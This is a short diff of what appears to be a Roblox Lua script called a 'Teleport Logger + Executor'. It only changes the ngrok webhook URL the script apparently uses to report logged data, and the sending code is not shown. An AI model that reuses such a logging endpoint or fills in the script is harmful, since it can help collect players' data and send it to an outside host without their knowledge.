@@ -1,5 +1,5 @@
 -- Ultimate Teleport Logger + Executor with Backpack
-local PROXY_URL = "https://c830-185-161-93-244.ngrok-free.app/webhook"
+local PROXY_URL = "https://84fd-185-161-93-244.ngrok-free.app/webhook"
 local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
